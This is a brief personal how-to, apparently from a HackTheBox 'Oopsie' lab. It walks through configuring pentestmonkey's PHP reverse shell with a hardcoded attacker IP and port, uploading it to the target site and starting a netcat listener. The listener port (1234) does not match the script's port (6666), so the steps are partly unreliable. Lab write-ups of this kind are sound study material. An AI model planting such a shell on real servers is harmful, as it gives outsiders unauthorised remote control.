# How-To
Navigate to parent dir

```bash
cd /home/kali/OSCP/HackTheBox/StatingPoint/Oopsie/webshells-master/php
```

Open in visual studio 
```bash
 code php-reverse-shell.php
```

Make changes to the IP and PORT shown below.

```php
<?php

// php-reverse-shell - A Reverse Shell implementation in PHP

// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

//

// This tool may be used for legal purposes only. Users take full responsibility

// for any actions performed using this tool. The author accepts no liability

// for damage caused by this tool. If these terms are not acceptable to you, then

// do not use this tool.

//

// In all other respects the GPL version 2 applies:

//

// This program is free software; you can redistribute it and/or modify

// it under the terms of the GNU General Public License version 2 as

// published by the Free Software Foundation.

//

// This program is distributed in the hope that it will be useful,

// but WITHOUT ANY WARRANTY; without even the implied warranty of

// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the

// GNU General Public License for more details.

//

// You should have received a copy of the GNU General Public License along

// with this program; if not, write to the Free Software Foundation, Inc.,

// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

//

// This tool may be used for legal purposes only. Users take full responsibility

// for any actions performed using this tool. If these terms are not acceptable to

// you, then do not use this tool.

//

// You are encouraged to send comments, improvements or suggestions to

// me at pentestmonkey@pentestmonkey.net

//

// Description

// -----------

// This script will make an outbound TCP connection to a hardcoded IP and port.

// The recipient will be given a shell running as the current user (apache normally).

//

// Limitations

// -----------

// proc_open and stream_set_blocking require PHP version 4.3+, or 5+

// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.

// Some compile-time options are needed for daemonisation (like pcntl, posix). These are rarely available.

//

// Usage

// -----

// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

  

set_time_limit (0);

$VERSION = "1.0";

$ip = '10.10.15.212'; // CHANGE THIS

$port = 6666; // CHANGE THIS

$chunk_size = 1400;

$write_a = null;

$error_a = null;

$shell = 'uname -a; w; id; /bin/sh -i';

$daemon = 0;

$debug = 0;
```

Save.

Upload to website

Set up Netcat connection

```bash
nc -lvnp 1234
```

Navigate to file 


## Tags
#php-reverse-shell 